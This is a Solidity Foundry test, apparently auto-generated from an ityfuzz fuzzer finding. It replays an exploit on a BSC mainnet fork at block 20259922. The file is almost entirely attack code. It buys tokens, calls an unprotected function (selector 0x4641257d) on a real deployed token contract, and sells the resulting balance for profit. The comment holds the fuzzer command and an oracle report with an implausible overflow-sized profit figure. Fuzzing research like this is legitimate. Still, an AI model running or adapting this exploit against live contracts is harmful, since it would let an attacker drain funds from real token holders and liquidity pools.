// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x55d398326f99059fF775485246999027B3197955,0x202b233735bF743FA31abb8f71e641970161bF98,0xa361433E409Adac1f87CDF133127585F8a93c67d,0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE,0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370,0xc30808d9373093fbfcec9e026457c6a9dab706a7,0x34bd6dba456bc31c2b3393e499fa10bed32a9370,0x93c175439726797dcee24d08e4ac9164e88e7aee -c bsc --onchain-block-number 20259922 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Earned 115792089237316195423570985008687907853269984665640564039457584007913129639935000000 more than owed 20000000000000000000000000, net earned = 115792089237316195423570985008687907853269984665640564039437584007913129639935000000wei (115792089237316195423570985008687907853269984665640564039437ETH)

================ Trace ================
[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   └─[1] Router.swapExactETHForTokens{value: 10.0 Ether}(0, path:(WETH → 0x55d398326f99059fF775485246999027B3197955), address(this), block.timestamp);
[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   ├─[1] 0xC30808D9373093fBFCEc9e026457C6a9DaB706a7.call(0x4641257d)
   │  ├─[2] [Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb.fallback()
   ├─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0xC30808D9373093fBFCEc9e026457C6a9DaB706a7 → WETH), address(this), block.timestamp);
   │  │  └─ ← ()
   │  │  └─ ← ()
   │  │  ├─[2] Router.swapExactTokensForETH(100% Balance, 0, path:(0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370 → WETH), address(this), block.timestamp);


 */

contract C55d3 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 20259922);
    }

    function test() public {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        address[] memory path0 = new address[](2);
        path0[0] = weth;
        path0[1] = 0x55d398326f99059fF775485246999027B3197955;
        vm.deal(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, 10000000000000000000);
        IUniswapV2Router(router).swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: 10000000000000000000
        }(0, path0, address(this), block.timestamp);
        
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        
        0xC30808D9373093fBFCEc9e026457C6a9DaB706a7.call(abi.encodeWithSignature(
            "4641257d()"
        )); 
        vm.startPrank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        uint256 amount0 = IERC20(0xC30808D9373093fBFCEc9e026457C6a9DaB706a7).balanceOf(address(this));
        IERC20(0xC30808D9373093fBFCEc9e026457C6a9DaB706a7).approve(router, amount0);
        address[] memory liq_path0 = new address[](2);
        liq_path0[0] = 0xC30808D9373093fBFCEc9e026457C6a9DaB706a7;
        liq_path0[1] = address(weth);
        vm.deal(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, amount0);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount0, 0, liq_path0, address(this), block.timestamp
        );
        vm.stopPrank();
    }

    // Stepping with return
    receive() external payable {}
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
